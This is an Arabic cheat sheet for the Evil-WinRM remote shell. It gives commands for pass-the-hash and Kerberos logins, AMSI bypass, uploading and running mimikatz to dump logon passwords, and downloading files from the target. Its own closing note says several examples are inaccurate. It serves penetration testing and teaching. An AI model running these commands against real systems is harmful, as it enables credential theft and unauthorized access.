<a id="-evil-winrm---windows-remote-shell"></a>
# 😈 Evil-WinRM — صدفة Windows عن بُعد

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███████╗██╗   ██╗██╗██╗      ██╗    ██╗██╗███╗   ██╗██████╗ ███╗   ███╗
  ██╔════╝██║   ██║██║██║      ██║    ██║██║████╗  ██║██╔══██╗████╗ ████║
  █████╗  ██║   ██║██║██║█████╗██║ █╗ ██║██║██╔██╗ ██║██████╔╝██╔████╔██║
  ██╔══╝  ╚██╗ ██╔╝██║██║╚════╝██║███╗██║██║██║╚██╗██║██╔══██╗██║╚██╔╝██║
  ███████╗ ╚████╔╝ ██║███████╗ ╚███╔███╔╝██║██║ ╚████║██║  ██║██║ ╚═╝ ██║
  ╚══════╝  ╚═══╝  ╚═╝╚══════╝  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝
                 The Ultimate WinRM Shell
```

يشير الرسم أعلاه إلى صدفة Evil-WinRM، وقد حُفظ بتنسيقه الأصلي. WinRM هو نظام إدارة Windows عن بُعد؛ وتتيح الصدفة التفاعلية إرسال أوامر PowerShell إلى النظام البعيد وفق صلاحيات الحساب المستخدم. يشير NTLM Hash إلى قيمة مشتقة من كلمة المرور، ويستخدم Kerberos تذاكر للمصادقة.

<p align="center">
  <img src="https://img.shields.io/badge/Evil--WinRM-Windows_Shell-red?style=for-the-badge" alt="Evil-WinRM">
  <img src="https://img.shields.io/badge/WinRM-5985%2F5986-blue?style=for-the-badge" alt="WinRM">
</p>

---

<a id="-table-of-contents"></a>
## 📋 المحتويات

- [ما هو Evil-WinRM؟](#-what-is-evil-winrm)
- [التثبيت](#-installation)
- [الاتصال الأساسي](#-basic-connection)
- [عمليات الملفات](#-file-operations)
- [الأوامر المدمجة](#-built-in-commands)
- [Pass-the-Hash](#-pass-the-hash)
- [المصادقة باستخدام Kerberos](#-kerberos-auth)
- [مرجع سريع](#-quick-reference)

---

<a id="-what-is-evil-winrm"></a>
## 🎯 ما هو Evil-WinRM؟

**Evil-WinRM** صدفة WinRM تتيح ميزات لاختبار الاختراق:

- 🖥️ **صدفة تفاعلية** - جلسة PowerShell كاملة
- 📁 **نقل الملفات** - رفع الملفات وتنزيلها
- 🔓 **Pass-the-Hash** - المصادقة باستخدام NTLM Hash
- 🎫 **Kerberos** - المصادقة باستخدام التذاكر
- 🧩 **الوحدات** - تحميل سكربتات PowerShell

<a id="winrm-ports"></a>
### منافذ WinRM

| المنفذ | البروتوكول | ملاحظات |
|------|----------|-------|
| 5985 | HTTP | الافتراضي |
| 5986 | HTTPS | مشفّر |

---

<a id="-installation"></a>
## 🚀 التثبيت

<a id="kali-linux"></a>
### Kali Linux

```bash
# التثبيت
sudo apt update
sudo apt install evil-winrm

# أو باستخدام gem
sudo gem install evil-winrm
```

<a id="from-github"></a>
### من GitHub

```bash
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
bundle install
ruby evil-winrm.rb --help
```

---

<a id="-basic-connection"></a>
## 💻 الاتصال الأساسي

<a id="password-authentication"></a>
### المصادقة بكلمة مرور

```bash
# اتصال أساسي
evil-winrm -i 10.10.10.10 -u user -p 'password'

# تحديد النطاق
evil-winrm -i 10.10.10.10 -u user -p 'password' -d domain.local

# HTTPS (المنفذ 5986)
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# تحديد المنفذ
evil-winrm -i 10.10.10.10 -u user -p 'password' -P 5986
```

<a id="ssl-options"></a>
### خيارات SSL

```bash
# SSL دون التحقق من الشهادة
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# باستخدام شهادة
evil-winrm -i 10.10.10.10 -u user -p 'password' -S -c cert.pem -k key.pem
```

---

<a id="-file-operations"></a>
## 📁 عمليات الملفات

<a id="upload-files"></a>
### رفع الملفات

```bash
# داخل صدفة Evil-WinRM
*Evil-WinRM* PS C:\> upload /local/path/file.exe

# رفع الملف إلى موقع محدّد
*Evil-WinRM* PS C:\> upload /local/path/file.exe C:\Windows\Temp\file.exe

# من سطر الأوامر (باستخدام -e)
evil-winrm -i 10.10.10.10 -u user -p pass -e /path/to/executables
```

<a id="download-files"></a>
### تنزيل الملفات

```bash
# تنزيل ملف
*Evil-WinRM* PS C:\> download C:\Users\admin\Desktop\flag.txt

# تنزيل الملف إلى موقع محدّد
*Evil-WinRM* PS C:\> download C:\secrets.txt /local/path/secrets.txt
```

<a id="executable-directory"></a>
### مجلد الملفات التنفيذية

```bash
# تحديد مجلد exe للرفع
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/tools/

# داخل الصدفة، ارفع أي ملف exe من ذلك المجلد
*Evil-WinRM* PS C:\> upload mimikatz.exe
```

---

<a id="-built-in-commands"></a>
## 🛠️ الأوامر المدمجة

<a id="menu"></a>
### القائمة

```bash
# عرض جميع الأوامر
*Evil-WinRM* PS C:\> menu

# الأوامر المتاحة:
Bypass-4MSI       - تجاوز AMSI
Dll-Loader        - تحميل DLL في الذاكرة
Donut-Loader      - تحميل تجميعة .NET
Invoke-Binary     - تنفيذ ملف ثنائي
services          - عرض الخدمات
upload            - رفع ملف
download          - تنزيل ملف
```

<a id="amsi-bypass"></a>
### تجاوز AMSI

```bash
# تجاوز AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# يمكنك الآن تشغيل أدوات يكتشفها مضاد الفيروسات
```

<a id="load-scripts"></a>
### تحميل السكربتات

```bash
# الاتصال مع تحديد مجلد السكربتات
evil-winrm -i 10.10.10.10 -u user -p pass -s /opt/scripts/

# داخل الصدفة، حمّل السكربت
*Evil-WinRM* PS C:\> PowerView.ps1

# استخدم دوال السكربت
*Evil-WinRM* PS C:\> Get-DomainUser
```

<a id="execute-binaries"></a>
### تنفيذ الملفات الثنائية

```bash
# تحميل مجلد الملفات التنفيذية
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/bin/

# تنفيذ الملف الثنائي في الذاكرة
*Evil-WinRM* PS C:\> Invoke-Binary /opt/bin/mimikatz.exe

# باستخدام معاملات
*Evil-WinRM* PS C:\> Invoke-Binary mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"
```

<a id="dll-loading"></a>
### تحميل مكتبات DLL

```bash
# تحميل مكتبة DLL
*Evil-WinRM* PS C:\> Dll-Loader -path C:\path\to\dll
```

<a id="services"></a>
### الخدمات

```bash
# عرض الخدمات
*Evil-WinRM* PS C:\> services
```

---

<a id="-pass-the-hash"></a>
## 🔓 Pass-the-Hash

<a id="ntlm-hash"></a>
### قيمة NTLM Hash

```bash
# الاتصال باستخدام Hash
evil-winrm -i 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# جزء NTLM فقط
evil-winrm -i 10.10.10.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# مع تحديد النطاق
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH -d domain.local
```

---

<a id="-kerberos-auth"></a>
## 🎫 المصادقة باستخدام Kerberos

<a id="setup"></a>
### الإعداد

```bash
# اضبط KRB5CCNAME ليشير إلى مخزن التذاكر
export KRB5CCNAME=/path/to/ticket.ccache

# عدّل /etc/krb5.conf لإعداد Realm
```

<a id="connect-with-kerberos"></a>
### الاتصال باستخدام Kerberos

```bash
# المصادقة باستخدام Kerberos
evil-winrm -i dc01.domain.local -r domain.local

# باستخدام ملف ccache محدّد
KRB5CCNAME=admin.ccache evil-winrm -i dc01.domain.local -r domain.local
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="connection-options"></a>
### خيارات الاتصال

| الخيار | الوصف |
|--------|-------------|
| `-i` | عنوان IP أو اسم المضيف المستهدف |
| `-u` | اسم المستخدم |
| `-p` | كلمة المرور |
| `-H` | قيمة NTLM Hash |
| `-d` | النطاق |
| `-S` | استخدام SSL ‏(HTTPS) |
| `-P` | المنفذ |
| `-r` | نطاق Kerberos ‏(Realm) |

<a id="file-options"></a>
### خيارات الملفات

| الخيار | الوصف |
|--------|-------------|
| `-s` | مجلد السكربتات |
| `-e` | مجلد الملفات التنفيذية |
| `-c` | شهادة SSL |
| `-k` | مفتاح SSL |

<a id="shell-commands"></a>
### أوامر الصدفة

| الأمر | الوصف |
|---------|-------------|
| `upload` | رفع ملف |
| `download` | تنزيل ملف |
| `menu` | عرض الأوامر |
| `Bypass-4MSI` | تجاوز AMSI |
| `Invoke-Binary` | تشغيل ملف exe في الذاكرة |
| `services` | عرض الخدمات |
| `Dll-Loader` | تحميل مكتبة DLL |

<a id="common-workflow"></a>
### سير عمل شائع

```bash
# 1. الاتصال
evil-winrm -i 10.10.10.10 -u admin -p 'P@ssw0rd'

# 2. تجاوز AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# 3. رفع الأدوات
*Evil-WinRM* PS C:\> upload /opt/tools/mimikatz.exe

# 4. التنفيذ
*Evil-WinRM* PS C:\> .\mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"

# 5. تنزيل النتائج
*Evil-WinRM* PS C:\> download C:\results.txt
```

---

<a id="-resources"></a>
## 📚 المراجع

- [مستودع Evil-WinRM على GitHub](https://github.com/Hackplayers/evil-winrm)
- [توثيق WinRM](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)

<a id="related-cheatsheets"></a>
### أوراق مرجعية ذات صلة
- [CrackMapExec](../../CrackMapExec/translations/README.ar.md)
- [Impacket](../../Impacket/translations/README.ar.md)
- [Mimikatz](../../Mimikatz/translations/README.ar.md)

---



> **توافق الخيارات:** حُفظت الأمثلة كما في المصدر. لا يظهر الخيار `-d` لتحديد النطاق في محلّل Evil-WinRM الحالي، ويقبل `-H` قيمة NT Hash من 32 حرفًا سداسيًا، لا صيغة LM:NT الكاملة. و`-P 5986` يغيّر المنفذ فقط، بينما `-S` يختار HTTPS. يستخدم التنفيذ الحالي تعطيل التحقق من شهادة الطرف المقابل؛ لذا لا تعني SSL وحدها التحقق من هوية الخادم. راجع [مصدر الخيارات والاتصال](https://github.com/Hackplayers/evil-winrm/blob/master/evil-winrm.rb).
>
> يخصّ `-e` مسار ملفات C#/.NET المحلية المستخدمة مع Invoke-Binary، وليس مجلدًا عامًا لكل عمليات upload؛ يعتمد رفع ملف باسم منفرد على وجوده في المجلد المحلي الحالي. Invoke-Binary مخصّص لتجميعات .NET، فلا يُفترض نجاح مثال mimikatz.exe الأصلي إذا كان ملفًا تنفيذيًا أصليًا (Native PE). كما أن Donut-Loader يحمّل حمولة Donut وليس مجرد أي تجميعة .NET، ومثال Dll-Loader مختصر يجب مطابقته مع نمط التحميل ونوع المكتبة الموثّقين. راجع [الأوامر الرسمية](https://github.com/Hackplayers/evil-winrm#advanced-commands) و[نقل الملفات](https://github.com/Hackplayers/evil-winrm#basic-commands).
>
> يتطلب الاتصال تفعيل WinRM ووجود مستمع مناسب وصلاحية الحساب للدخول إلى نقطة النهاية. لا يعني HTTP انعدام تشفير الرسائل: يمكن لـ WinRM استخدام تشفير على مستوى الرسائل بعد مصادقة NTLM/Kerberos، بينما يوفّر HTTPS طبقة TLS. يتطلب Kerberos تذكرة صالحة وإعداد Realm واسم مضيف/SPN مناسبًا وتوقيتًا متوافقًا؛ راجع [دليل المشروع](https://github.com/Hackplayers/evil-winrm#kerberos) و[أمان PowerShell Remoting](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/winrm-security).
>
> عبارة المصدر التي تفترض إمكان تشغيل كل أداة يكتشفها مضاد الفيروسات بعد Bypass-4MSI تبسيط غير مضمون. AMSI واجهة لفحص المحتوى، وتجاوزها في سياق معيّن لا يعطّل جميع آليات AV/EDR أو يضمن عمل التقنية على كل إصدار؛ راجع [تعريف Microsoft لـ AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal). بقيت أسماء الأوامر والقيم والـ hashes وبيانات الاعتماد التجريبية دون تغيير.

<p align="center">
  <b>😈 صدفة WinRM متكاملة!</b><br>
  <i>Evil-WinRM — أداة للتحكم في Windows أثناء اختبار الاختراق</i>
</p>
